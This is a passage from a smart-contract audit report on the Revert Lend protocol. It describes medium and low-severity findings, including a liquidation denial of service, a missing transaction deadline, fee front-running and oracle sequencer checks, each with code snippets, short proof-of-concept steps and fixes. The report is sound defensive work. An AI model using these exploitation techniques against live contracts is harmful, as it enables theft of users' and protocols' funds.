The problem arises when admins would want a collateral removed from the system. There would be multiple reasons as to why this might be the case:

- The underlying collateral has become too volatile.
- The DAO in charge of Revert protocol decides to remove it as a collateral.
- There has been some kind of a change in the mechanics of how that token operates and Revert wants it removed (e.g. upgradeable tokens, most-popular examples include USDC/USDT).

The only way in which this could be performed is to set the `collateralFactor` back to `0`, but this would break core mechanics such as liquidations.

### Proof of Concept

All approved collateral which admins decided should be utilized inside of the protocol is introduced by increasing the `collateralFactor` through `setTokenConfig()`:

     function setTokenConfig(address token, uint32 collateralFactorX32, uint32 collateralValueLimitFactorX32)
            external
            onlyOwner
        {
            if (collateralFactorX32 > MAX_COLLATERAL_FACTOR_X32) {
                revert CollateralFactorExceedsMax();
            }
            tokenConfigs[token].collateralFactorX32 = collateralFactorX32;
            tokenConfigs[token].collateralValueLimitFactorX32 = collateralValueLimitFactorX32;
            emit SetTokenConfig(token, collateralFactorX32, collateralValueLimitFactorX32);
        }

Once a token's `collateralFactor` was set, and removed afterward due to extraordinary circumstances, all outstanding loans will never be able to be liquidated either due to panic reverts because of overflow/underflow or panic reverts due to division/modulo by `0`.

The problem arises when `_checkLoanIsHealthy()` is called within `liquidate()` (the same can be tested by calling `loanInfo()` as well, since it also calls `_checkLoanIsHealthy()`).

      function _checkLoanIsHealthy(uint256 tokenId, uint256 debt)
            internal
            view
            returns (bool isHealthy, uint256 fullValue, uint256 collateralValue, uint256 feeValue)
        {
            (fullValue, feeValue,,) = oracle.getValue(tokenId, address(asset));
            uint256 collateralFactorX32 = _calculateTokenCollateralFactorX32(tokenId);
            collateralValue = fullValue.mulDiv(collateralFactorX32, Q32);
            isHealthy = collateralValue >= debt;
        }

This happens because when calculating the `collateralValue` through `_checkLoanIsHealthy` as it can be seen here:

    function _checkLoanIsHealthy(uint256 tokenId, uint256 debt)
            internal
            view
            returns (bool isHealthy, uint256 fullValue, uint256 collateralValue, uint256 feeValue)
        {
            (fullValue, feeValue,,) = oracle.getValue(tokenId, address(asset));
            uint256 collateralFactorX32 = _calculateTokenCollateralFactorX32(tokenId);
            collateralValue = fullValue.mulDiv(collateralFactorX32, Q32);
            isHealthy = collateralValue >= debt;
        }

Since it's needed to calculate the liquidation collateral value as it can be seen in the `liquidate()` function:

```
(state.isHealthy, state.fullValue, state.collateralValue, state.feeValue) =
            _checkLoanIsHealthy(params.tokenId, state.debt);
```

Since the collateral factor will be `0`, the `collateralValue` will also be `0`, this will lead to passing `0` as a value in the `_calculateLiquidation()` function:

     (state.liquidationValue, state.liquidatorCost, state.reserveCost) =
                _calculateLiquidation(state.debt, state.fullValue, state.collateralValue);

Which will always revert due to division with `0`:

    unction _calculateLiquidation(uint256 debt, uint256 fullValue, uint256 collateralValue)
            internal
            pure
            returns (uint256 liquidationValue, uint256 liquidatorCost, uint256 reserveCost)
        {
                ...
                uint256 startLiquidationValue = debt * fullValue / collateralValue;
                ...

This can be tested via PoC, by inserting the following line in the `testLiquidation()` test in V3Vault.t.sol:

`vault.setTokenConfig(address(USDC), 0, type(uint32).max);` `vault.setTokenConfig(address(DAI)`, `0`, `type(uint32).max)`

You can change USDC/DAI one or both with whatever collateral is part of the NFT in question and run `testLiquidationTimeBased()`.

### Recommended Mitigation Steps

Don't use the `collateralFactor` as the common denominator whether a token is accepted as collateral or not; use a method such as whitelisting tokens by address and performing necessary checks to see if the token address matches the whitelist.

### Assessed type

DoS

**[kalinbas (Revert) confirmed, but disagreed with severity](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/158#issuecomment-2020753589)**

**[ronnyx2017 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/158#issuecomment-2028551226):**
 > Valid DOS, but needs admin config upgrade. Since the modification of this config is reasonable and normal, it is classified as Medium.

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/25).

**Status:** Mitigation Confirmed. Full details in reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/54), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/95) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/21).

***

## [[M-21] Dangerous use of deadline parameter](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/147)
*Submitted by [y0ng0p3](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/147), also found by [0xk3y](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/515), [falconhoof](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/460), [Mike\_Bello90](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/454), [Myd](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/306), [th3l1ghtd3m0n](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/234), [0xspryon](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/197), and [lightoasis](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/38)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/transformers/AutoCompound.sol#L159-L172> 

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1032-L1074>

### Vulnerability details

The protocol is using `block.timestamp` as the `deadline` argument while interacting with the Uniswap NFT Position Manager, which completely defeats the purpose of using a deadline.

Actions in the Uniswap `NonfungiblePositionManager` contract are protected by a deadline parameter to limit the execution of pending transactions. Functions that modify the liquidity of the pool check this parameter against the current block timestamp in order to discard expired actions.

These interactions with the Uniswap position are present throughout the code base, in particular and not only in the functions: `V3Utils::_swapAndMint`, `Automator::_decreaseFullLiquidityAndCollect`, `LeverageTransformer::leverageUp`. Those functions call their corresponding functions in the Uniswap Position Manager, providing the `deadline` argument with their own `deadline` argument.

On the other hand, `AutoCompound::execute` and `V3Vault::_sendPositionValue` functions provide `block.timestamp` as the argument for the `deadline` parameter in their call to the corresponding underlying Uniswap `NonfungiblePositionManager` contract.

```solidity
File: src/transformers/AutoCompound.sol

// deposit liquidity into tokenId
if (state.maxAddAmount0 > 0 || state.maxAddAmount1 > 0) {
    _checkApprovals(state.token0, state.token1);


    (, state.compounded0, state.compounded1) = nonfungiblePositionManager.increaseLiquidity(
        INonfungiblePositionManager.IncreaseLiquidityParams(
@@->    params.tokenId, state.maxAddAmount0, state.maxAddAmount1, 0, 0, block.timestamp
        )
    );


    // fees are always calculated based on added amount (to incentivize optimal swap)
    state.amount0Fees = state.compounded0 * rewardX64 / Q64;
    state.amount1Fees = state.compounded1 * rewardX64 / Q64;
}
```

```solidity
File: src/V3Vault.sol

if (liquidity > 0) {
    nonfungiblePositionManager.decreaseLiquidity(
        INonfungiblePositionManager.DecreaseLiquidityParams(tokenId, liquidity, 0, 0, block.timestamp)
    );
}
```

Using `block.timestamp` as the deadline is effectively a no-operation that has no effect nor protection. Since `block.timestamp` will take the timestamp value when the transaction gets mined, the check will end up comparing `block.timestamp` against the same value (see [here](<https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/base/PeripheryValidation.sol#L7>)).

### Impact

Failure to provide a proper deadline value enables pending transactions to be maliciously executed at a later point. Transactions that provide an insufficient amount of gas such that they are not mined within a reasonable amount of time, can be picked by malicious actors or MEV bots and executed later in detriment of the submitter. See [this issue](https://github.com/code-423n4/2022-12-backed-findings/issues/64) for an excellent reference on the topic (the author runs a MEV bot).

### Recommended Mitigation Steps

As done in the [`LeverageTransformer::leverageUp`](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/transformers/LeverageTransformer.sol#L82) and [`V3Utils::_swapAndIncrease`](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/transformers/V3Utils.sol#L768) functions, add a deadline parameter to the `AutoCompound::execute` and `V3Vault::_sendPositionValue` functions and forward this parameter to the corresponding underlying call to the Uniswap `NonfungiblePositionManager` contract.

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/147#issuecomment-2020750693)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> PR [here](https://github.com/revert-finance/lend/pull/24) - added deadline where missing.

**Status:** Mitigation Confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/96), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/55) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/23).

***

## [[M-22] `dailyDebtIncreaseLimitLeft` is not updated in `liquidate()`](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/140)
*Submitted by [lanrebayode77](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/140), also found by [Aymen0909](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/325) and [0xAlix2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/43)*

On days with a significant number of liquidated positions, particularly when the asset quantity is substantial, there will be an excess of assets available in the vault that cannot be borrowed; thereby, causing a drastic decrease in the utilization rate.

This also contradicts what was stated in the `repay()` function, which asserts that repaid amounts should be borrowed again. Liquidation is also a form of repayment:

```solidity
 // when amounts are repayed - they may be borrowed again
        dailyDebtIncreaseLimitLeft += assets; 
```

### Proof of Concept

`dailyDebyIncreaseLimitLeft` was not increamented in `liquidate()`, see [here](https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L685-L757).

### Recommended Mitigation Steps

Include `dailyDebyIncreaseLimitLeft` increment in `liquidate()`.

```solidity
dailyDebtIncreaseLimitLeft += state.liquidatorCost;
```

### Assessed type

Context

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/140#issuecomment-2020691059)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/11).

**Status:** Mitigation Confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/97), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/56) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/24).

***

## [[M-23] `AutoRange` execution can be front-ran to avoid protocol fee, causing loss for protocol](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/110)
*Submitted by [0xjuan](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/110)*

When users configure their NFT within the `AutoRange` contract, they have 2 options for fee-handling:

1. Protocol takes 0.15% of the entire position size.
2. Protocol takes a higher fee of 2%, but only from the position's collected fees.

The user sets `PositionConfig.onlyFees=false` for the first option, and `onlyFees=true` for the second option. When an operator calls the `AutoRange.execute()` function, they set the reward parameter `rewardX64` based on the user's `PositionConfig`.

However, the execution can be front-ran by the user. They can change the `onlyFees` boolean, which changes the fee handling logic, while the `rewardX64` parameter set by the operator is unchanged.

The user can exploit this to their advantage by initially setting `onlyFees` to false, so that the operator will call the function with only 0.15% reward percentage. But when the operator sends their transaction, the user front-runs it by changing `onlyFees` to true. Now, the protocol only gets 0.15% of the fees collected when they initially intended to collect 0.15% of the entire position.

### Impact

The cost of executing the swap is likely to exceed the fees obtained (since expected fee is 0.15% of entire position, but only 0.15% of fees are obtained). This leads to loss of funds for the protocol.

> Note: this has been submitted as only a medium severity issue since the protocol's off-chain operator logic can simply blacklist such users once they have performed the exploit.

### Proof of Concept

See [the rewardX64 parameter](<https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/transformers/AutoRange.sol#L62>) and [docs regarding fee source](<https://docs.revert.finance/revert/auto-range#selecting-a-fee-source>).

### Recommended Mitigation Steps

Let the operator pass in 2 different values for `rewardX64`, where each one corresponds to a different value of `onlyFees`. This way, the `rewardX64` parameter passed in will not be inconsistent with the executed logic.

### Assessed type

MEV

**[kalinbas (Revert) acknowledged and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/110#issuecomment-2020655311):**
 > As you mentioned we are solving this with the bot off-chain; it is a valid finding.

***

## [[M-24] Incorrect liquidation fee calculation during underwater liquidation, disincentivizing liquidators to participate](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/53)
*Submitted by [0xjuan](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/53)*

As stated in the [Revert Lend Whitepaper](https://github.com/revert-finance/lend-whitepaper/blob/main/Revert_Lend-wp.pdf), the liquidation fee for underwater positions is supposed to be 10% of the debt. However, the code within `V3Vault::_calculateLiquidation` (shown below) calculates the liquidation fee as 10% of the `fullValue` rather than 10% of the `debt`.

```solidity
        } else {
            // all position value
            liquidationValue = fullValue;


            uint256 penaltyValue = fullValue * (Q32 - MAX_LIQUIDATION_PENALTY_X32) / Q32;
            liquidatorCost = penaltyValue;
            reserveCost = debt - penaltyValue;
        }
```

> Note: `fullValue * (Q32 - MAX_LIQUIDATION_PENALTY_X32) / Q32;` is equivalent to `fullValue * 90%`.

The code snippet is [here](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L1112-L1119).

### Impact

As the `fullValue` decreases below `debt` (since the position is underwater), liquidators are less-and-less incentivised to liquidate the position. This is because as `fullValue` decreases, the liquidation fee (10% of `fullValue`) also decreases.

This goes against the protocol's intention (stated in the whitepaper) that the liquidation fee will be fixed at 10% of the debt for underwater positions, breaking core protocol functionality.

### Proof of Concept

[Code snippet from `V3Vault._calculateLiquidation`](<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1112-L1119>).

### Recommended Mitigation Steps

Ensure that the liquidation fee is equal to 10% of the debt. Make the following changes in `V3Vault::_calculateLiquidation()`:

```diff
else {
-// all position value
-liquidationValue = fullValue;


-uint256 penaltyValue = fullValue * (Q32 - MAX_LIQUIDATION_PENALTY_X32) / Q32;
-liquidatorCost = penaltyValue;
-reserveCost = debt - penaltyValue;

+uint256 penalty = debt * (MAX_LIQUIDATION_PENALTY_X32) / Q32; //[10% of debt]
+liquidatorCost = fullValue - penalty;
+liquidationValue = fullValue;
+reserveCost = debt - liquidatorCost; // Remaining to pay. 
}   
```

### Assessed type

Error

**[kalinbas (Revert) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/53#issuecomment-2021429312):**
 > Low severity.


**[ronnyx2017 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/53#issuecomment-2028499772):**
 > According to the C4 rules, Medium is appropriate, as this disrupts certain designs in the economic model.

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> PR [here](https://github.com/revert-finance/lend/pull/7) - fixed calculation.

**Status:** Mitigation Confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/98), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/57) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/25).

***

## [[M-25] Asymmetric calculation of price difference](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/10)
*Submitted by [t4sk](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/10), also found by [Bauchibred](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/209), [lanrebayode77](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/130), and [hunter\_w3b](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/478)*

Price difference is calculated in 2 ways depending on whether `price > verified price` or not.

If `price > verified price`, this is the equation:

    (price - verified price) / price

Otherwise price is calculated with this equation:

    (verified price - price) / verified price

When the 2 equations above are graphed with `price = horizontal axis`, we get 2 different curves, see [here](<https://www.desmos.com/calculator/nixha3ojz6>).

The first equation produces a asymptotic curve (shown in red). The second equation produces a linear curve (shown in green). Therefore, the rate at which the price difference changes is different depending on whether `price > verified price` or not.

### Example

Price difference of `+1` or `-1` from `verified price` are not symmetric:

```python
# p < v
v = 2
p = 1
d = (v - p) / v
print(d)
# output is 0.5
```

```python
# p > v
v = 2
p = 3
d = (p - v) / p
print(d)
# output is 0.33333
```

### Tools Used

Desmos graphing calculator and python

### Recommended Mitigation Steps

Use a different equation to check price difference (shown in blue [here](<https://www.desmos.com/calculator/nixha3ojz6>)):

    |price - verified price| / verified price <= max difference

Assuming `verifyPriceX96 > 0`:

```solidity
        uint256 diff = priceX96 >= verifyPriceX96
            ? (priceX96 - verifyPriceX96) * 10000
            : (verifyPriceX96 - priceX96) * 10000;
        
        require(diff / verifyPriceX96 <= maxDifferenceX1000)
```

### Assessed type

Math

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/10#issuecomment-2020581889)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> PR [here](https://github.com/revert-finance/lend/pull/5) - fixed calculation.

**Status:** Mitigation Confirmed. Full details in reports from [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/33) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/58).

***

## [[M-26] Some ERC20 can revert on a zero value transfer](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/14)

*Submitted by [DadeKuma](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/14)*

*Note: This finding was reported via the winning [Automated Findings report](https://github.com/code-423n4/2024-03-revert-lend/blob/main/bot-report.md). It was declared out of scope for the audit, but is being included here for completeness.*

[728](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/V3Vault.sol#L728), [946](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/V3Vault.sol#L946), [226](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/automators/Automator.sol#L226), [272](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/transformers/AutoCompound.sol#L272), [88](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/transformers/LeverageTransformer.sol#L88), [91](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/transformers/LeverageTransformer.sol#L91), [872](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/transformers/V3Utils.sol#L872), [85](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/utils/FlashloanLiquidator.sol#L85), [98](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/utils/Swapper.sol#L98), [167](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/utils/Swapper.sol#L167)

### Vulnerability details

Not all `ERC20` implementations are totally compliant, and some (e.g. `LEND`) may fail while transferring a zero amount.

```solidity
File: src/V3Vault.sol

728: 		            SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), state.liquidatorCost);

946: 		        SafeERC20.safeTransfer(IERC20(asset), receiver, assets);
```

```solidity
File: src/automators/Automator.sol

226: 		            SafeERC20.safeTransfer(token, to, amount);
```

```solidity
File: src/transformers/AutoCompound.sol

272: 		        SafeERC20.safeTransfer(IERC20(token), to, amount);
```

```solidity
File: src/transformers/LeverageTransformer.sol

88: 		            SafeERC20.safeTransfer(IERC20(token0), params.recipient, amount0 - added0);

91: 		            SafeERC20.safeTransfer(IERC20(token1), params.recipient, amount1 - added1);
```

```solidity
File: src/transformers/V3Utils.sol

872: 		            SafeERC20.safeTransfer(token, to, amount);
```

```solidity
File: src/utils/FlashloanLiquidator.sol

85: 		        SafeERC20.safeTransfer(data.asset, msg.sender, data.liquidationCost + (fee0 + fee1));
```

```solidity
File: src/utils/Swapper.sol

98: 		                SafeERC20.safeTransfer(params.tokenIn, universalRouter, params.amountIn);

167: 		        SafeERC20.safeTransfer(IERC20(tokenIn), msg.sender, amountToPay);
```


**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/14#issuecomment-2020587235)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/28).

**Status:** Mitigation Confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/72), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/61) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/34).

***

## [[M-27] Missing L2 sequencer checks for Chainlink oracle](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/12)

*Submitted by [DadeKuma](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/12)*

*Note: This finding was reported via the winning [Automated Findings report](https://github.com/code-423n4/2024-03-revert-lend/blob/main/bot-report.md). It was declared out of scope for the audit, but is being included here for completeness.*

[337](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/V3Oracle.sol#L337)

### Vulnerability details

Using Chainlink in L2 chains such as Arbitrum [requires](https://docs.chain.link/data-feeds/l2-sequencer-feeds) to check if the sequencer is down to avoid prices from looking like they are fresh although they are not.

The bug could be leveraged by malicious actors to take advantage of the sequencer downtime.

```solidity
File: src/V3Oracle.sol

// @audit missing sequencer uptime, grace period checks
337: 		        (, int256 answer,, uint256 updatedAt,) = feedConfig.feed.latestRoundData();
```

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/12#issuecomment-2020583775)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/27).

**Status:** Mitigation Error. Full details in reports from [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/5), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/60) and [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/71), and also included in the [Mitigation Review](#mitigation-review) section below.

***

# Low Risk and Non-Critical Issues

For this audit, 43 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/128) by **Bauchibred** received the top score from the judge.

*The following wardens also submitted reports: [cryptphi](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/520), [thank\_you](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/434), [FastChecker](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/404), [Norah](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/401), [Arabadzhiev](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/393), [santiellena](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/392), [btk](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/374), [VAD37](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/371), [CRYP70](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/366), [kfx](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/356), [zaevlad](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/355), [14si2o\_Flint](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/343), [ktg](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/318), [Bigsam](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/302), [jnforja](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/229), [kennedy1030](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/221), [0xspryon](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/200), [MohammedRizwan](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/188), [t4sk](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/180), [0xAlix2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/172), [adeolu](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/168), [y0ng0p3](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/150), [lanrebayode77](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/125), [Timenov](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/74), [tpiliposian](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/17), [0x11singh99](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/507), [JecikPo](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/473), [BowTiedOriole](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/452), [grearlake](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/451), [0x175](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/449), [0xPhantom](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/405), [wangxx2026](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/367), [givn](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/337), [Aymen0909](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/328), [0xGreyWolf](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/281), [KupiaSec](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/265), [crypticdefense](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/181), [0xDemon](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/112), [stonejiajia](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/100), [Topmark](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/85), [DanielArmstrong](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/78), and [n1punp](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/3).*

## [01] `_checkApprovals` should be reimplemented to count for the allowance depleting

The function `_checkApprovals` is designed to only set approvals if the current allowance is zero. This is a one-time setup meant to minimize gas costs associated with setting allowances for token transfers.

```solidity
function _checkApprovals(address token0, address token1) internal {
    uint256 allowance0 = IERC20(token0).allowance(address(this), address(nonfungiblePositionManager));
    if (allowance0 == 0) {
        SafeERC20.safeApprove(IERC20(token0), address(nonfungiblePositionManager), type(uint256).max);
    }
    uint256 allowance1 = IERC20(token1).allowance(address(this), address(nonfungiblePositionManager));
    if (allowance1 == 0) {
        SafeERC20.safeApprove(IERC20(token1), address(nonfungiblePositionManager), type(uint256).max);
    }
}
```

While setting the allowance to `type(uint256).max` reduces the need for repeated approvals (and thus saves gas), it neglects the scenario where the allowance might be fully utilized. In typical use cases, reaching `type(uint256).max` would require an unrealistic volume of transactions. However, it does not account for potential bugs, exploits, or changes in contract logic that could deplete this allowance unexpectedly.

### Impact

The current implementation of the `_checkApprovals` function sets the token allowance to `type(uint256).max` for the `nonfungiblePositionManager` contract, intending to save on gas costs for future transactions. However, this approach introduces a vulnerability where, once the `type(uint256).max` allowance is exhausted, there would be no mechanism in place to renew the approval. This could lead to a situation where the smart contract is unable to perform operations requiring token transfers on behalf of users, effectively freezing any functionality dependent on these approvals.

### Recommended Mitigation Steps

Instead of only checking for an allowance of zero, implement a mechanism to check if the allowance is below a certain threshold and, if so, replenish it.

## [02] Setters should always have equality checkers

Using [this](https://github.com/search?q=repo%3Acode-423n4%2F2024-03-revert-lend%20function%20set&type=code) search prompt code, we can see that multiple setter functions exist in scope, with them not having any check that the new accepted value is not equal to the previously stored value.

For example, [setReward()](https://github.com/code-423n4/2024-03-revert-lend/blob/ac520c5fedf4e1654c597a46efaf5a7c27295de1/src/transformers/AutoCompound.sol#L243-L247) checks that the new value is `<=` whereas it should only check `<` leading to an unnecessary update of `totalRewardX64` if `_totalRewardX64 is already == totalRewardX64`.

```solidity
    function setReward(uint64 _totalRewardX64) external onlyOwner {
        require(_totalRewardX64 <= totalRewardX64, ">totalRewardX64");
        totalRewardX64 = _totalRewardX64;
        emit RewardUpdated(msg.sender, _totalRewardX64);
    }
```

Another example would be the below, that does not implement any checks whatsoever:

```
 function setWithdrawer(address _withdrawer) public onlyOwner {
 emit WithdrawerChanged(_withdrawer);
withdrawer = _withdrawer;
}
```

### Impact

Unnecessary code execution.

### Recommended Mitigation Steps

Introduce equality checkers for setter functions.

## [03] Introduce better naming conventions

Taking a look [here](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Oracle.sol#L25-L28), we can see that this is used to declare the `MIN_PRICE_DIFFERENCE` as 2%. The issue is that this value is actually the min max price difference, see [here](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Oracle.sol#L183-L191).

```solidity
    function setMaxPoolPriceDifference(uint16 _maxPoolPriceDifference) external onlyOwner {
        if (_maxPoolPriceDifference < MIN_PRICE_DIFFERENCE) {
            revert InvalidConfig();
        }
        maxPoolPriceDifference = _maxPoolPriceDifference;
        emit SetMaxPoolPriceDifference(_maxPoolPriceDifference);
    }
```

We can see that whenever setting the max pool price difference, it's checked to not be lower than our `MIN_PRICE_DIFFERENCE`.

### Impact

Confusion in naming conventions leading to hard time of users/developers understanding code.

### Recommended Mitigation Steps

Consider renaming the variable and take into account that it's the minimum max difference between the prices.

**[kalinbas (Revert) acknowledged and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/128#issuecomment-2023151471):**
> [01] - This will never reach 0 for a normal token (and this code is already deployed) - so we will leave it.<br>
> [02] - Only called by admin so not that important.<br>
> [03] - Ok agree.

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/128#issuecomment-2050761513):**
 > [01] - Low.<br>
